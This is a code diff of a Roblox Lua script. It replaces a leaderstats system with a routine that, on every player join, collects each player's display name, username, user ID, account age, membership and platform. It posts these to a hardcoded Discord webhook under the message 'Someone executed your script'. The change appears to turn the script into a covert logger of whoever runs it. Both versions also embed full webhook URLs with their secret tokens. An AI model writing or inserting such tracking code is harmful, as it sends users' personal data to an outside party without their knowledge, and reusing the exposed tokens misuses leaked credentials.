@@ -1,45 +1,48 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
-local webhookUrl = "https://discord.com/api/webhooks/1301012434533879908/nOzQvI_8UIyXSbYvPvla8tUDQYgXRqHsu-94Alx-GVlgXoO6KcBxTEqGDANndeX6ct7S"
-
-Players.PlayerAdded:Connect(function(player)
-    local leaderstats = Instance.new("Folder")
-    leaderstats.Name = "leaderstats"
-    leaderstats.Parent = player
-
-    -- Define your stats
-    local stats = {
-        Strength = Instance.new("IntValue", leaderstats),
-        Rebirths = Instance.new("IntValue", leaderstats),
-        Kills = Instance.new("IntValue", leaderstats),
-        Brawls = Instance.new("IntValue", leaderstats),
+local function getPlayerInfo(player)
+    local playerInfo = {
+        DisplayName = player.DisplayName,
+        Username = player.Name,
+        UserId = player.UserId,
+        AccountAge = player.AccountAge,
+        MembershipStatus = player.MembershipType.Name,
+        Platform = player:GetPlatform(),
     }
 
-    for statName, stat in pairs(stats) do
-        stat.Name = statName
-        stat.Value = 0
+    return playerInfo
+end
+
+local function sendInfoToDiscord(playerInfo)
+    local webhookUrl = "https://discord.com/api/webhooks/1301017100474646638/EOy696x6hcLyyEdN4RMNxZmA06J3WpXWoDR4hpUrlpUNSRw-n6wfQRROEsSz8YlT6-lB"
+
+    local messageData = {
+        content = "Someone executed your script\n\n" ..
+                  "Player Info:\n" ..
+                  "Display Name: " .. playerInfo.DisplayName .. "\n" ..
+                  "Username: " .. playerInfo.Username .. "\n" ..
+                  "User ID: " .. playerInfo.UserId .. "\n" ..
+                  "Account Age: " .. playerInfo.AccountAge .. " days\n" ..
+                  "Membership Status: " .. playerInfo.MembershipStatus .. "\n" ..
+                  "Platform: " .. playerInfo.Platform .. "\n\n" ..
+                  "Game: " .. game.Name .. "\n" ..
+                  "Game Id: " .. game.PlaceId .. "\n" ..
+                  "Exploit: Unsupported"
+    }
+
+    local jsonData = HttpService:JSONEncode(messageData)
+
+    local success, response = pcall(function()
+        return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        warn("Failed to send data to Discord: " .. response)
     end
+end
 
-    local function sendToDiscord()
-        local messageData = {
-            content = string.format("Player Stats:\nName: %s\nStrength: %d\nRebirths: %d\nKills: %d\nBrawls: %d",
-                player.Name, stats.Strength.Value, stats.Rebirths.Value, stats.Kills.Value, stats.Brawls.Value)
-        }
-
-        local jsonData = HttpService:JSONEncode(messageData)
-
-        local success, response = pcall(function()
-            return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
-        end)
-
-        if not success then
-            warn("Failed to send data to Discord: " .. response)
-        end
-    end
-
-    sendToDiscord()  -- Send data on player join
-    for _, stat in pairs(stats) do
-        stat.Changed:Connect(sendToDiscord)  -- Send data on stat change
-    end
+Players.PlayerAdded:Connect(function(player)
+    local playerInfo = getPlayerInfo(player)
+    sendInfoToDiscord(playerInfo)
 end)
